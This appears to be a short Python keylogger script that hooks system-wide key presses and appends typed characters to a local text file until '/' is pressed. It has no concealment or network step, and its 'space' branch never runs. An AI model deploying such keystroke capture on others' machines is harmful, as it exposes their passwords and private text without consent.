import keyboard

filename = "what-i-type.txt"


def capture_input(event):
    if len(event.name) == 1:
        key_name = event.name
        with open(filename, "a") as f:
            if key_name == "space":
                f.write(chr(32))
            else:
                f.write(key_name)
        if key_name == "/":
            keyboard.unhook_all()


keyboard.on_press(capture_input)

while True:
    pass